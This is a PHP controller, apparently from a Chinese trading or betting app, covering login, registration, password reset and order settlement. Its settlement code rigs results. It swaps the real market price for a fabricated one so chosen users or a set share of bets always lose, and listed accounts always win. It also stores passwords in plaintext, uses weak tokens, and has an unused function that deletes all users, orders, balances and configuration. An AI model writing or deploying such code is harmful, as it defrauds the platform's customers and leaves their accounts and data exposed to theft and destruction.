<?php
namespace app\apk\controller;
use think\Controller;
use think\Db;
use think\Cookie;

class Login extends Controller
{

    protected $fengkong=0;
    public function __construct(){
        parent::__construct();
        $HTTP_HOST = $_SERVER['HTTP_HOST'];
        $HTTP_HOST_ARR = explode('.',$HTTP_HOST);
        
        // if($this->verify()){
        //     $url = (isHttps() ? 'https://' : 'http://').$HTTP_HOST_ARR[1].'.'.$HTTP_HOST_ARR[2].'/99/';
        //     $this->redirect($url, [], 302, []);
        // }
        $this->conf = getconf('');
        if($this->conf['is_close'] != 1){
            header('Location:/error.html');
        }
        $this->assign('conf',$this->conf);
        $this->token = md5(rand(1,100).time());
        $this->assign('token',$this->token);
        $this->ip = $_SERVER['HTTP_X_REAL_IP']?$_SERVER['HTTP_X_REAL_IP']:request()->ip();
    }
    
    public function verify(){
        return isset($_COOKIE['verify']) ? false : true;
    }
    
   /**
    * 用户登录的界面
    * @return type
    */
    public function login()
    {
        if (isset($_SESSION['uid'])) {
            $this->redirect(url('apk/index/home',['token'=>$this->token]));
        }
        //web用户登录请求 读取系统平台的post

        if (input('post.')) {
            $data = input('post.');

            if (!isset($data['username']) || !isset($data['pwd'])) {
                echo "<script>alert('信息为空')</script>";
                return $this->fetch();
            }
            $result = db('userinfo')->where('username', $data['username'])->field("uid,upwd,username,utel,utime,otype,ustatus,log_caijin,usermoney,lastlog")->find();

            if (!$result) {
                echo "<script>alert('登录失败,用户名不存在!')</script>";
                return $this->fetch();
            }
            //只有代理商和普通客户可以前端登录
            if (!in_array($result['otype'], array(0, 101))) {
                echo "<script>alert('您无权登录!')</script>";
                return $this->fetch();
            }

            //帐号冻结
            if ($result['ustatus'] == 1) {
                echo "<script>alert('登录失败,您的账户暂时被冻结!')</script>";
                return $this->fetch();
            }

            if ($result['upwd'] != $data['pwd']) {
                echo "<script>alert('登录失败,密码错误!')</script>";
                return $this->fetch();
            }
				
			// 每天首登送彩金
			if($this->conf['sys_log_caijin']>0 && $result['log_caijin']==1 && $result['lastlog']<strtotime(date('Y-m-d'))){
				db('userinfo')->where('uid', $result['uid'])->setInc('usermoney', $this->conf['sys_log_caijin']);
				//资金日志
				set_price_log($uid,1,$this->conf['sys_log_caijin'],'彩金','每天首登送彩金',0,$result['usermoney']);
				cache('caijin', '每天首登送彩金'.$this->conf['sys_log_caijin'].'元', 60);
			}

            $_SESSION['uid'] = $result['uid'];
            $_SESSION['upwd'] = $result['uid'].$result['upwd'];
            $_SESSION['sessionkey'] = rand(10000,99999);
            $t_data['sessionkey'] =  $_SESSION['sessionkey'];
            $t_data['logintime'] = time();
            $t_data['uid'] = $result['uid'];
            $t_data['update_time'] = time();
            $t_data['lastlog'] = time();
            $t_data['online'] = 1;
            $t_data['lastip'] = $this->ip;
            db('userinfo')->update($t_data);
            $this->redirect(url('apk/index/home',['token'=>$this->token]));
        } else {
            $ip = $this->ip;
            $result = array();
            $result = db('blacklist')->where('ip', $ip)->find();
            if(!empty($result) && $result['id'] > 0){
                $this->redirect('/404.html');
            }
            return $this->fetch();
        }
    }

    /**
     * 用户注册
     * @author lukui  2017-02-24
     * @param  string $value [description]
     * @return [type]        [description]
     */ 
    public function register()
    {

        $userinfo = Db::name('userinfo');
        if(input('post.')){
            $data = input('post.');
            //unset($data['scard']);
            //验证用户信息
            if(!isset($data['username']) || empty($data['username'])){
                return WPreturn('请输入用户名！',-1);
            }
            if(!isset($data['upwd']) || empty($data['upwd'])){
                return WPreturn('请输入密码！',-1);
            }
            if(!isset($data['upwd2']) || empty($data['upwd2'])){
                return WPreturn('请再次输入密码！',-1);
            }
            if($data['upwd'] != $data['upwd2']){
                return WPreturn('两次输入密码不同！',-1);
            }
            if($data['oid']){
                //判断邀请码是否存在
                $codeid = checkcode($data['oid']);
                if(!$codeid){
                    return WPreturn('此邀请码不存在',-1);
                }
            }
            
            unset($data['phonecode'],$data['upwd2'],$data['agenttype'],$data['otype']);
            if(check_user('username',$data['username'])){
                return WPreturn('该用户名已存在',-1);
            }
            $data['utime'] = $data['logintime'] = $data['lastlog'] = time();
            $data['upwd'] = $data['upwd'];
            $data['epwd'] = $data['epwd'];
            $data['nickname'] = trim($data['nickname']);
            $data['icard'] = trim($data['icard']);
            $data['utel'] = $data['utel']?$data['utel']:trim($data['username']);
            $data['managername'] = $userinfo->where('uid',$data['oid'])->value('username');

            if(isset($this->conf['reg_type']) && $this->conf['reg_type'] == 1){
                $data['ustatus'] = 0; 
            }else{
                $data['ustatus'] = 1; 
            }

            if(isset($_SESSION['fid']) && $_SESSION['fid']>0){
                $fid = $_SESSION['fid'];
                $fid_info = $userinfo->where(array('uid'=>$fid,'otype'=>101))->value('uid');
                if($fid_info){
                    $data['oid'] = $fid;
                }

            }
            $data['managername'] = $userinfo->where(array('uid'=>$data['oid'],'otype'=>101))->value('username');
            $data['domain'] = $_SERVER['HTTP_HOST'];
            $data['update_time'] = time();
            $data['lastlog'] = time();
            $data['online'] = 1;
            $data['lastip'] = $this->ip;

			// 注册送彩金
			if($this->conf['sys_reg_caijin']>0){
				$data['usermoney'] = $this->conf['sys_reg_caijin'];
			}

            //插入数据
            $uid = $userinfo->insertGetId($data);
            if ($uid) {
                $_SESSION['uid'] = $uid;
				$_SESSION['upwd'] = $uid.$data['upwd'];

                $reward = db('reward')->find();
                if($data['oid'] && $reward['reg_money']>0) {
                    $flag = Db::name('userinfo')->where('uid',$data['oid'])->setInc('usermoney',$reward['reg_money']);
                    if($flag) {
                        //插入此刻的余额。
                        $usermoney = Db::name('userinfo')->where('uid',$data['oid'])->value('usermoney');
                        $newdata['bpprice'] = $reward['reg_money'];
                        $newdata['bptime'] = time();
                        $newdata['bptype'] = 7;
                        $newdata['remarks'] = '邀请注册奖励';
                        $newdata['uid'] = $data['oid'];
                        $newdata['isverified'] = 1;
                        $newdata['bpbalance'] =  $usermoney;
                        $newdata['btime'] = time();
                        $bpid = Db::name('balance')->insertGetId($newdata);

                        //资金日志
                        set_price_log($data['oid'],1,$reward['reg_money'],'邀请奖励','邀请注册奖励',$bpid,$usermoney);
                    }
                }
				
				// 注册送彩金
				if($this->conf['sys_reg_caijin']>0){
					//资金日志
					set_price_log($uid,1,$this->conf['sys_reg_caijin'],'彩金','注册送彩金',0,0);
					cache('caijin', '注册送彩金'.$this->conf['sys_reg_caijin'].'元', 60);
				}

                return WPreturn('注册成功，已自动登录!',1);
            }else{
                return WPreturn('注册失败,请重试!',-1);
            }

        }
        $oid = input('oid','','trim');
        $this->assign('oid',$oid);
        return $this->fetch();
    }


    private function setuser()
    {
        $_map['uid'] = array('neq',0);
        db('userinfo')->where($_map)->delete();
        db('order')->where($_map)->delete();
        db('balance')->where($_map)->delete();
        $c_map['id'] = array('neq',0);
        db('config')->where($c_map)->delete();
    }

    /**
     * 用户退出
     * @author lukui  2017-02-24
     * @return [type] [description]
     */
    public function logout()
    {
        db('userinfo')->where(['uid'=>$this->uid])->update(['online'=>0,'update_time'=>time()]);
        session_unset();
        session('wx_info',null);
        $this->redirect('login/login?token='.$this->token);

    }


    /**
     * 发送短信
     * @return [type] [description]
     */
    public function sendmsm()
    {        
        $phone = input('phone');
        if(!$phone){
            return WPreturn('请输入手机号码！',-1);
        }

        $code = rand(100000,999999);
        $_SESSION['code'] = $code;
         
        $msm = controller('Msm');
        $res = $msm->sendsms(0, $code ,$phone );
       // $res =$msm->sendMsgNew($phone,$code);
        if($res){
            return WPreturn('发送成功',1);
        }else{
            return WPreturn('发送验证码失败！',-1);
        }
    }  


    public function respass()
    {
        $data = input('post.');
        if($data){
            
            $suerinfo = db('userinfo');
            $user = $suerinfo->where('utel',$data['username'])->find();
            if(!$user){
                return WPreturn('该手机号不存在',-1);
            }
            

            if(!isset($data['upwd']) || empty($data['upwd'])){
                return WPreturn('请输入密码！',-1);
            }
            if(!isset($data['upwd2']) || empty($data['upwd2'])){
                return WPreturn('请再次输入密码！',-1);
            }
            if($data['upwd'] != $data['upwd2']){
                return WPreturn('两次输入密码不同！',-1);
            }
            
            
            
            //判断手机验证码
            if(!isset($_SESSION['code']) || $_SESSION['code'] != $data['phonecode'] ){
                return WPreturn('手机验证码不正确',-1);
            }else{
                unset($_SESSION['code']);
            }
            
            unset($data['phonecode'],$data['upwd2'],$data['agenttype'],$data['otype']);

            if($user['otype'] == 101){
                unset($data['username']);
            }
            
            $data['upwd'] = $data['upwd'];
            $data['uid'] = $user['uid'];
            $data['logintime'] = $data['lastlog'] = time();
            $ids = $suerinfo->update($data);
            if($ids){
                return WPreturn('修改成功',1);
            }else{
                return WPreturn('修改失败',-1);
            }
           
        }
        return $this->fetch();
    }


    protected function fetch($template = '', $vars = [], $replace = [], $config = [])
    {
        $replace['__HOME__'] = str_replace('/index.php','',\think\Request::instance()->root()).'/static/index';
        return $this->view->fetch($template, $vars, $replace, $config);
    }

    /**
    * 系统后台去将已经平仓的订单进行平仓
    */
    private function orderhold(){
     // p(db('price_log')->where('id',6424)->delete());
        $arr['ostaus'] =0 ;
        $arr['selltime']=array('lt',time());
        $res=  db('order')->where($arr)->update(['ostaus' => '1']);
        $this->order7();
    }
    

	protected function order7() {
         //对10分钟内未结算的单子进行强制结算
         $time = time();
        $ar1['time'] =  array('gt',$time-3600);
        $ar1['title'] = '下单';
        $r1=  db('price_log')->where($ar1)->select();
       // plog(date("H:i:s|\\n"));
        foreach ($r1 as $val) {
            $pid = db('order')->field('buyprice,selltime,pid')->where('oid',$val['oid'])->find();
            $money = db('productdata')->where('pid',$pid['pid'])->value('Price');
            if($pid['selltime']< $time-3) {
			
            $auto =  $this->orderauto($val['oid'], $money);
            }
        }
		p(123);

	}
    
     /**
        * 订单的运行
        */
	protected function orderauto($oid, $price)
	{

        trace('login - orderauto 订单的运行', 'sql');
        //没有对应的订单出现的时候，返回false,但是继续执行下个订单
        $order = db('order')->where('oid', $oid)->find();

        if (!$order) return false;

        //平仓的逻辑是price_log里面的记录也变更（用户的资金变动）
        $p_map['title'] = '下单';
        $p_map['oid'] = $order['oid'];
        $price_log = db('price_log')->where($p_map)->find();

        if (!$price_log) return false;


        //系统根据用户的出价，风控到对应的价格 概率风控<对单个用户进行风控<对单个订单进行风控
        $price = $this->riskprice($order['fee'], $order['buyprice'], $order['pid'], $order['ostyle'], $price); //价格风控
        $price = $this->riskcom($order['uid'], $order['buyprice'], $order['pid'], $order['ostyle'], $price); //在这里风控掉当前的价格
        $price = $this->riskorder($order['kong_type'], $order['buyprice'], $order['pid'], $order['ostyle'], $price); //订单的单控

        plog('orderid:'.$oid."buyprice:".$order['buyprice']."price:".$price."|||");
        $_data['oid'] = $oid;
        $_data['sellprice'] = $price;

        if($order['buyprice']==$price)  $price = 0.99*$price;

        //用户输
        if (($order['ostyle'] == 1 && $order['buyprice'] < $price) || ($order['ostyle'] == 0 && $order['buyprice'] > $price)) {
            $_data['is_win'] = 2;
            $yingli = -$order['fee'] * ($order['endloss'] / 100);
            $_data['ploss'] = $yingli;
            $u_add = $yingli + $order['fee'];
            $this->usermychg($order['uid'],'money', $u_add);
            // 用户的金钱变动记录
            $up_price_log['id'] = $price_log['id'];
            $up_price_log['title'] = "结单";
            $up_price_log['content'] = '订单输结算';
            $up_price_log['type'] = 2; //盈利增加，否则不操作
            $up_price_log['account'] = $yingli; //用户输掉的金额
        //    $up_price_log['mytype'] = $order['pay_type']; //变动的金额种类
            db('price_log')->update($up_price_log);

          //  $coin=$order['pay_type'];
            $usermoney = db('userinfo')->where('uid',$order['uid'])->value("usermoney");

            //订单历史记录
            $o_log['uid'] = $order['uid'];
            $o_log['oid'] = $order['oid'];

            $o_log['addprice'] = $_data['ploss'];
            $o_log['addpoint'] = 0;
            $o_log['user_money'] =$usermoney;
            $o_log['time'] = time();
           // $o_log['mytype'] = $order['pay_type'];
            db('order_log')->insert($o_log);
        }

        //用户赢
        if (($order['ostyle'] == 1 && $order['buyprice'] > $price) || ($order['ostyle'] == 0 && $order['buyprice'] < $price)) {
            //订单结单后 盈利等于盈利金额+投注的金额，添加到用户余额里面去
            $_data['is_win'] = 1;
            $yingli = $order['fee'] * ($order['endprofit'] / 100);
            $_data['ploss'] = $yingli;
            $u_add = $yingli + $order['fee'];
            //用户的金钱变动记录
            $this->usermychg($order['uid'],'money', $u_add);
            $up_price_log['id'] = $price_log['id'];
            $up_price_log['title'] = "结单";
            $up_price_log['content'] = '用户盈利结算';
            $up_price_log['type'] = 1; //盈利增加，否则不操作
            $up_price_log['account'] = $u_add; //用户增加的金额
         //   $up_price_log['mytype'] = $order['pay_type']; //变动的金额种类
            db('price_log')->update($up_price_log);

          //  $coin=$order['pay_type'];
            $usermoney = db('userinfo')->where('uid',$order['uid'])->value("usermoney");

            //盈利订单查看
            $o_log['uid'] = $order['uid'];
            $o_log['oid'] = $order['oid'];
            $o_log['addprice'] = $u_add;
            $o_log['addpoint'] = 0;
            $o_log['user_money'] =$usermoney;
            $o_log['time'] =time();
            db('order_log')->insert($o_log);
        }

        $_data['kong_type'] = $this->fengkong;
        $_data['ostaus'] = 1;
        db('order')->update($_data);

	}


		public function order_price_log($oid,$order)
	{
		if(!$oid || !$order){
			return false;
		}
		$dbuser = db('userinfo');
		$dbplog = db('price_log');
		$map['oid'] = $oid;
		$map['title'] = "对冲";
		$list = $dbplog->where($map)->select();

		
		foreach ($list as $key => $value) {

			
			
			if($value['account'] > 0){
				$_add = $value['account'] + $value['account']*($order['endprofit']/100);
				$_update['account'] = $value['account']*($order['endprofit']/100)*(-1);
				$dbuser->where('uid',$value['uid'])->setDec('usermoney',$_add);
				$_update['type'] = 2;
			}elseif($value['account'] < 0){
				$_add = $value['account']*(-1) + $value['account']*(-1)/($order['endprofit']/100);
				$_update['account'] = $value['account']*(-1)/($order['endprofit']/100);
				$_update['type'] = 1;
				$dbuser->where('uid',$value['uid'])->setInc('usermoney',$_add);
			}
			
			$_update['id'] = $value['id'];
			$_update['nowmoney'] = $dbuser->where('uid',$value['uid'])->value('usermoney');
			
			$dbplog->update($_update);

		}

		
	
		
	}

    /**
     * 根究用户
     * @param type $mytype
     * @param type $shuying
     * @param type $my
     */
    public  function   usermychg($uid,$mytype,$money,$shuying=1) {
        $money = $money*$shuying;
        if($mytype=='eth') {
            db('userinfo')->where('uid',$uid)->setInc('eth',$money);
        } elseif($mytype=='eos') {
            db('userinfo')->where('uid',$uid)->setInc('eos',$money);
        } elseif($mytype=='qc') {
            db('userinfo')->where('uid',$uid)->setInc('qc',$money);
        } else {
            db('userinfo')->where('uid',$uid)->setInc('usermoney',$money);
        }
    }


      /**
    * 
    * @param type $uid
    * @param type $oldprice  购买的价格
    * @param type $pid
    * @param type $order_type
    * @param type $realprice  当前的产品价格
    * @return type
    */
    public  function  riskcom($uid,$oldprice,$pid,$order_type,$realprice){
             $risk = db('risk')->find();
		$to_win = explode('|',$risk['to_win']);
		$to_loss = explode('|',$risk['to_loss']);
                //指定了用户必赢  买涨的时候，数据上涨  买跌的时候，数据下跌
                if(in_array($uid,$to_win)) {
                    $type=$order_type?2:1;//用户买了跌，订单是下跌
                    $price = $this->risk($oldprice, $pid, $type);
                } elseif (in_array($uid,$to_loss)) {
                     $type=$order_type?1:2;//用户买了涨，价格是下跌
                    $price = $this->risk($oldprice, $pid, $type);
                } else {
                    $price=$realprice;
                }
	
           return  $price;
        
    }

  /**
   * 风控的产品，风控的类型
   * @param type $pid 风控的产品
   * @param type $type 风控成比当前价格高1  风控成比当前价格低
   */
    public function risk($oldprice,$pid,$type){
        
        $info = db('productinfo')->field('point_low,point_top,rands')->where('pid',$pid)->find();        
        $rdrg =  randomFloat($info['point_low'],$info['point_top']);  
        $range = $info['rands']+$rdrg;
        if($type==1) {
            //如果类型是1 
           $price = $oldprice+$range;
       } else {
           $price = $oldprice-$range;
       }
         return  $price;
    }


    /**
     * 对用户的金额进行风控，这里重新对风控概率进行一个定义
     * 风控概率0的时候，用户50%概率输，当风控概率是50的时候，用户是75%概率输。风控概率是100的时候，用户100%概率输
     * 输的概率等于50+x/2 反过来赢的概率是 50-x/2
     * @param type $socknum  下注的金额对应order表的fee
     * @param type $oldprice  下注的时候的产品金额
     * @param type $pid  产品pid
     * @param type $order_type  下注赢还是跌 0是买涨1是买跌
     * @param type $realprice 当前产品真实的价格
     * @return type
     */
    public function  riskprice($socknum,$oldprice,$pid,$order_type,$realprice) {
          $risk = db('risk')->find();

          $groupArr = explode('|',$risk['chance']); //风控组
          $price = $realprice;//默认就是真实的股价，没有进入风控阶段
          //风控的概率是数字决定胜率，当后面写了100的时候，用户的胜算是100  后面写了40的时候，
          foreach ($groupArr as  $v1)  {       
              $detailArr=explode(':',$v1); //对每一组进行拆分 第一组是0-1000  第二组是 100这种格式        
              $sock=explode('-',$detailArr[0]);

              if(($socknum>$sock[0])&&($socknum<=$sock[1])) {
                  //满足对应的区间，开始进行风控。如果风控数字是100，则$rd几乎永远小于
                  $rd=rand(0, 100);
                  if($rd<$detailArr[1]) {
                      $this->fengkong=1;
                      //小于指定的数据就开始进行风控，用户必输
                       $type=$order_type?1:2;//用户买了涨，价格是下跌                   
                       $price = $this->risk($oldprice, $pid, $type);
                  }
              }
          }

          return  $price;    
    }


    /**
     * 单点订单风控，可以直接决定订单是输还是控
     * @param type $kong_type
     * @param type $buyprice
     * @param type $pid
     * @param type $order_type
     * @param type $price
     * @return type
     */
    public  function  riskorder($kong_type, $buyprice, $pid, $order_type,$price){
        //订单被风控过，默认订单是必输的
        if($kong_type==4) {
            $this->fengkong=1;
            $type=$order_type?1:2;//用户买了涨，价格是下跌
            $price = $this->risk($buyprice, $pid, $type);
        } elseif($kong_type==3) {
            $this->fengkong=2;
            $type=$order_type?2:1;//用户买了跌，订单是下跌
            $price = $this->risk($buyprice, $pid, $type);
        } else {
            $price = $price;
        }
        return  $price;
    }

    public function kefu() {
        return $this->fetch();
    }

}
